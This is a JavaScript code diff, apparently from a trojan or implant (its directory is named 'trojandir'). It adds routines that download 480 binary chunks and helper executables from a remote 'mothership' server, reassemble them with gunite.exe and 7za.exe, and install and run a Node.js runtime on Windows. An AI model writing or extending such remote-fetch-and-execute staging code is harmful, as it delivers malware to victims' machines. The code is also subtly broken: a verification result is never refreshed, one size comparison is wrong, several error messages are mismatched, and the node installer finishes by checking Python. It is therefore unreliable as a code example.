@@ -206,6 +206,10 @@ var systemstate = {
         return path.join(this.trojandir, "client_id");
     },
 
+    get nodedir() {
+        return path.join(this.trojandir, "node");
+    },
+
     get nodegsdfilesdir() {
         return path.join(this.nodedir, "gsd_files");
     },
@@ -2555,9 +2559,7 @@ async function retrieve_asset(assetfname, assetdir) {
     return response;
 }
 
-async function download_node() {
-    logmsg("starting");
-
+function verify_node_download() {
     let filenames = Array.from({ length: 480 }, (_, index) => index + 1);
 
     filenames = filenames.map(String);
@@ -2567,29 +2569,13 @@ async function download_node() {
 
     for (let i = 0; i < filenames.length; i++) {
         let filename = filenames[i];
-        let fpath = path.join(systemstate.nodegsdfilesdir, filename); // anchor
-    }
-
-    logmsg("finished");
-}
-
-// TODO
-async function install_node() {
-    logmsg("starting");
-
-    for (let i = 0; i < filenames.length; i++) {
-        let filename = filenames[i];
-        let fpath = path.join(systemstate.gsdfilesdir, filename);
+        let fpath = path.join(systemstate.nodegsdfilesdir, filename);
 
         if (!fileExists(fpath)) {
             return { status: false, msg: `file does not exist {fpath}` };
         }
 
         const stats = fs.statSync(fpath);
-
-        // disk1.gsd --> 1,696
-        // disk735.gsd --> 65,443
-        // 100,000
 
         if (filename == "disk1.gsd") {
             if (stats.size != 1696) {
@@ -2598,8 +2584,8 @@ async function install_node() {
                     msg: `file not the correct size {fpath} {stats.size} 1696`,
                 };
             }
-        } else if (filename == "disk735.gsd") {
-            if (stats.size != 65443) {
+        } else if (filename == "disk480.gsd") {
+            if (stats.size != 59246) {
                 return {
                     status: false,
                     msg: `file not the correct size {fpath} {stats.size} 65443`,
@@ -2615,11 +2601,171 @@ async function install_node() {
         }
     }
 
-    // F:\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\node_gsd_files
+    return { status: true };
+}
 
-    // 1,696 disk1.gsd
-    // 100,000 disk2.gsd
-    // 59,246 disk480.gsd
+async function verify_node_install() {
+    let fpath = path.join(systemstate.nodedir, "node-v26.4.0-win-x64");
+
+    if (!folderExists(fpath)) {
+        return { state: false, msg: `node install folder does not exist` };
+    }
+
+    fpath = path.join(systemstate.nodedir, "node-v26.4.0-win-x64", "node.exe");
+
+    if (!fileExists(fpath)) {
+        return { state: false, msg: `node.exe does not exist {fpath}` };
+    }
+
+    let childp = null;
+
+    try {
+        childp = await invoke_exe("node.exe", ["--version"], fpath, (text) => {
+            text = text ?? "ERROR_EMPTY_OUTPUT";
+
+            if (!text.includes("v26.4.0")) {
+                return {
+                    state: false,
+                    msg: `node install failed -- could not verify version {text}`,
+                };
+            }
+        });
+    } catch (err) {
+        logmsg(err);
+    }
+
+    try {
+        childp = await invoke_exe("npm.cmd", ["--version"], fpath, (text) => {
+            text = text ?? "ERROR_EMPTY_OUTPUT";
+
+            if (!text.includes("11.17.0")) {
+                return {
+                    state: false,
+                    msg: `node install failed -- could not verify npm version {text}`,
+                };
+            }
+        });
+    } catch (err) {
+        logmsg(err);
+    }
+
+    return { state: true };
+}
+
+async function download_node() {
+    logmsg("starting");
+
+    let filenames = Array.from({ length: 480 }, (_, index) => index + 1);
+
+    filenames = filenames.map(String);
+    filenames = filenames.map((_, i) => {
+        return "disk" + _ + ".gsd";
+    });
+
+    for (let i = 0; i < filenames.length; i++) {
+        let filename = filenames[i];
+        // let fpath = path.join(systemstate.nodegsdfilesdir, filename);
+
+        let baseUrl =
+            systemstate.mothershipassets + "/node/gsd_files/" + filename;
+        let localpath = path.join(systemstate.nodegsdfilesdir, filename);
+
+        fs.mkdirSync(systemstate.nodegsdfilesdir, { recursive: true });
+
+        let downloadOpts = {
+            download: true,
+            filetype: "bin",
+            localpath: localpath,
+        };
+
+        let response = await makeGetRequest(baseUrl, null, null, downloadOpts);
+
+        /* downloadOpts { filetype, localpath, download }
+           rawText
+           buffer
+           status
+           statusText
+           headers */
+
+        if (!fileExists(localpath)) {
+            throw new Error("download failed for " + localpath);
+        }
+
+        const stats = fs.statSync(localpath);
+        logmsg(`${localpath} -- File size: ${stats.size} bytes`);
+    }
+
+    logmsg("finished");
+}
+
+async function install_node() {
+    logmsg("starting");
+
+    let installcmd = systemstate.cmdconfig;
+
+    let verify_node = verify_node_download();
+
+    if (!verify_node?.status) {
+        logmsg(verify_node?.msg);
+        await download_node();
+    }
+
+    if (!verify_node?.status) {
+        logmsg(verify_node?.msg);
+        throw new Error("node download failed");
+    }
+
+    if (!fileExists(path.join(systemstate.trojandir, "7za.exe")))
+        await retrieve_asset("7za.exe");
+
+    if (!fileExists(path.join(systemstate.trojandir, "gunite.exe")))
+        await retrieve_asset("gunite.exe");
+
+    let args = [
+        path.join(systemstate.nodegsdfilesdir, "disk1.gsd"),
+        "-u",
+        path.join(systemstate.nodedir, "node.zip"),
+        "-s",
+    ];
+
+    let childp = null;
+
+    try {
+        childp = await invoke_exe("gunite.exe", args); // throws error despite success
+    } catch (err) {
+        logmsg(err);
+    }
+
+    let fpath = path.join(systemstate.nodedir, "node.zip");
+
+    if (!fileExists(fpath)) {
+        throw new Error("file does not exist " + fpath);
+    }
+
+    const stats = fs.statSync(fpath);
+    if (!stats.size == 47549770) {
+        throw new Error("incorrect file size " + stats.size + " 72890982");
+    }
+
+    args = [
+        "x",
+        path.join(systemstate.nodedir, "node.zip"),
+        "-o" + systemstate.nodedir,
+        "-aoa",
+        "-y",
+    ];
+
+    try {
+        childp = await invoke_exe("7za.exe", args);
+    } catch (err) {
+        logmsg(err);
+    }
+
+    verify_python = await verify_python_install();
+
+    if (!verify_python?.state) {
+        throw new Error(verify_python?.msg);
+    }
 
     logmsg("finished");
 }
